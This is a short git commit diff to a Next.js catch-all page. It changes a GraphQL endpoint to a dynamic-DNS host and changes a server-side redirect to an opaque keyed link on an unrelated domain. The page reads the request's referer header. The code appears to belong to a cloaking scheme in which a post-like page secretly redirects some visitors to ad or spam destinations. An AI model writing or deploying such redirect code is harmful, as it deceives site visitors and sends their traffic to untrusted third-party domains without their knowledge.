e76795fa71ef1ffe5d2acd125fefdea87a9d3588
yourkalon000 <165013795+yourkalon000@users.noreply.github.com>
2025-05-19 21:52:30 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://cycletojen.xyz/graphql"
+	const endpoint = "https://consolehd.ip-ddns.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://cycletojen.xyz/milo/` 
+					`https://accommodateyours.com/nyuszxhww?key=76c979c9288c2619fdc1289cc13e480b` 
 				}`,
 			},
 		};
